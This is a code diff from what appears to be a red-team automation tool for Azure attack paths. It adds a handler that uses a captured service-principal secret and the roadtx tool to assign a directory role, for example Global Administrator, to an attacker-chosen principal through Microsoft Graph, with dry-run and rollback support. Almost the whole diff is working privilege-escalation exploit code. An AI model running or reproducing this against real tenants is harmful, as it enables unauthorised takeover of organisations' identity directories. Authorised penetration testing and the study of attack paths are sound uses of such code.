@@ -171,6 +171,135 @@ class AZAddSecretHandler(AzureBaseHandler):
             step_index=0,
             action_type="azure_remove_secret",
             description=f"Remove added secret (keyId {key_id}) from {edge.target.name}",
-            command=f"roadtx graphrequest -m POST -u {url} -d '{{\"keyId\":\"{key_id}\"}}'",
+            command=f"roadtx graphrequest -m POST -d '{{\"keyId\":\"{key_id}\"}}' {url}",
+            reversible=True,
+        )
+
+
+@register_handler("AZMGGrantRole")
+class AZMGGrantRoleHandler(AzureBaseHandler):
+    """AZMGGrantRole: a service principal holding RoleManagement.ReadWrite.Directory
+    assigns a directory role (e.g. Global Administrator) to a principal we control.
+
+    Auth is **client-credentials** as the source SP (appId + a secret captured by
+    a preceding AZAddSecret step, or passed via ``-p``).  Graph:
+    ``POST /roleManagement/directory/roleAssignments``.
+    Rollback: ``DELETE /roleManagement/directory/roleAssignments/{id}``.
+    """
+
+    def _sp_creds(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
+        """Resolve (appId, secret) for the source SP.
+
+        Order: explicit ``-p source_appid=``/``-p secret=`` props, then a
+        captured ``azure_secret`` credential (from a prior AZAddSecret step),
+        then BH node props.
+        """
+        appid = edge.properties.get("source_appid") or edge.source.properties.get("appid")
+        secret = edge.properties.get("secret")
+        if not secret:
+            for c in self.cred_store.all_credentials():
+                if c.cred_type == CredentialType.azure_secret and (
+                    not appid or c.username == appid
+                ):
+                    secret, appid = c.value, (appid or c.username)
+                    break
+        if emitting():
+            appid, secret = (appid or "<SP_APP_ID>"), (secret or "<SP_SECRET>")
+        return appid, secret
+
+    @staticmethod
+    def _role_definition_id(edge: EdgeInfo) -> str | None:
+        """roleDefinitionId for the target role (BH AZRole objectid = ``<templateId>@<tenantId>``)."""
+        rid = edge.properties.get("role_definition_id") or edge.target.properties.get(
+            "templateid"
+        )
+        if not rid and edge.target.object_id:
+            rid = edge.target.object_id.split("@")[0]
+        if not rid and emitting():
+            rid = "<ROLE_TEMPLATE_ID>"
+        return rid
+
+    @staticmethod
+    def _promote_principal(edge: EdgeInfo) -> str | None:
+        """Object id of the principal to receive the role (``-p promote=<objectId>``)."""
+        p = edge.properties.get("promote")
+        if not p and emitting():
+            p = "<PRINCIPAL_OBJECT_ID>"
+        return p
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        if edge.target.label != "AZRole":
+            return False, f"AZMGGrantRole needs an AZRole target, got {edge.target.label}"
+        appid, secret = self._sp_creds(edge)
+        if not appid or not secret:
+            return False, (
+                "No SP appId/secret — run AZAddSecret on the SP's app first, or pass "
+                "-p source_appid=<appId> -p secret=<value>"
+            )
+        if not self._promote_principal(edge):
+            return False, "No principal to promote — pass -p promote=<objectId>"
+        if not self._role_definition_id(edge):
+            return False, f"Could not determine role definition id for {edge.target.name}"
+        return True, (
+            f"SP {edge.source.name} can grant {edge.target.name} to "
+            f"{self._promote_principal(edge)}"
+        )
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        az = self._azure_cfg()
+        appid, secret = self._sp_creds(edge)
+        role_def_id = self._role_definition_id(edge)
+        principal_id = self._promote_principal(edge)
+
+        if dry_run:
+            return (
+                True,
+                f"[DRY RUN] Would grant role {role_def_id} to {principal_id} "
+                f"as SP {appid}",
+                [],
+            )
+
+        tenant = az.tenant_id if az else "<TENANT>"
+        token = await roadtx.get_sp_token(
+            appid, secret, tenant, roadtx_bin=(az.roadtx_path if az else "roadtx")
+        )
+        if not token:
+            return False, "Failed to obtain SP client-credentials token via roadtx", []
+
+        res = await roadtx.graph_request(
+            "POST",
+            "/roleManagement/directory/roleAssignments",
+            token,
+            body={
+                "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
+                "roleDefinitionId": role_def_id,
+                "principalId": principal_id,
+                "directoryScopeId": "/",
+            },
+        )
+        if not res.get("success"):
+            return False, f"Role assignment failed: {res.get('error', 'unknown')}", []
+
+        assignment_id = (res.get("parsed") or {}).get("id")
+        self._last_assignment_id = assignment_id
+        return (
+            True,
+            f"Granted {edge.target.name} (roleDefId {role_def_id}) to principal "
+            f"{principal_id} (assignment {assignment_id})",
+            [],
+        )
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
+        aid = getattr(self, "_last_assignment_id", None)
+        if not aid:
+            return None
+        url = f"{roadtx.GRAPH_BASE}/roleManagement/directory/roleAssignments/{aid}"
+        return RollbackAction(
+            step_index=0,
+            action_type="azure_remove_role_assignment",
+            description=f"Remove role assignment {aid} ({edge.target.name})",
+            command=f"roadtx graphrequest -m DELETE {url}",
             reversible=True,
         )
